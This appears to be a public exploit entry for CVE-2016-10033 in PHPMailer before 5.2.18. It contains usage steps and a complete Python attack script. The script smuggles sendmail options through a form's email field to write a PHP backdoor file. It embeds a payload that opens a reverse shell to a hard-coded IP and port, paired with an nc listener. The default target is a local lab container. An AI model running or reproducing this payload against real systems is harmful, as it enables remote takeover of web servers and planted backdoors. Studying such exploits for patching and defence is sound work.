# Exploit Title: PHPMailer Exploit v1.0
# Date: 29/12/2016
# Exploit Author: Daniel aka anarc0der
# Version: PHPMailer < 5.2.18
# Tested on: Arch Linux
# CVE : CVE 2016-10033
 
Description:
Exploiting PHPMail with back connection (reverse shell) from the target
 
Usage:
1 - Download docker vulnerable enviroment at: https://github.com/opsxcq/exploit-CVE-2016-10033
2 - Config your IP for reverse shell on payload variable
4 - Open nc listener in one terminal: $ nc -lnvp <your ip>
3 - Open other terminal and run the exploit: python3 anarcoder.py
 
Video PoC: https://www.youtube.com/watch?v=DXeZxKr-qsU
 
Full Advisory:
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
"""
 
from requests_toolbelt import MultipartEncoder
import requests
import os
import base64
from lxml import html as lh
 
os.system(&#039;clear&#039;)
print("\n")
print(" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ ")
print("██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗")
print("███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝")
print("██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗")
print("██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║")
print("╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
print("      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com")
print(" Version 1.0 - github.com/anarcoder - greetings opsxcq & David Golunski\n")
 
target = &#039;http://localhost:8080&#039;
backdoor = &#039;/backdoor.php&#039;
 
payload = &#039;<?php system(\&#039;python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\&#039;192.168.0.12\\\&#039;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\&#039;); ?>&#039;
fields={&#039;action&#039;: &#039;submit&#039;,
        &#039;name&#039;: payload,
        &#039;email&#039;: &#039;"anarcoder\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\" @protonmail.com&#039;,
        &#039;message&#039;: &#039;Pwned&#039;}
 
m = MultipartEncoder(fields=fields,
                     boundary=&#039;----WebKitFormBoundaryzXJpHSq4mNy35tHe&#039;)
 
headers={&#039;User-Agent&#039;: &#039;curl/7.47.0&#039;,
         &#039;Content-Type&#039;: m.content_type}
 
proxies = {&#039;http&#039;: &#039;localhost:8081&#039;, &#039;https&#039;:&#039;localhost:8081&#039;}
 
 
print(&#039;[+] SeNdiNG eVIl SHeLL To TaRGeT....&#039;)
r = requests.post(target, data=m.to_string(),
                  headers=headers)
print(&#039;[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D&#039;)
r = requests.get(target+backdoor, headers=headers)
if r.status_code == 200:
    print(&#039;[+]  ExPLoITeD &#039; + target)

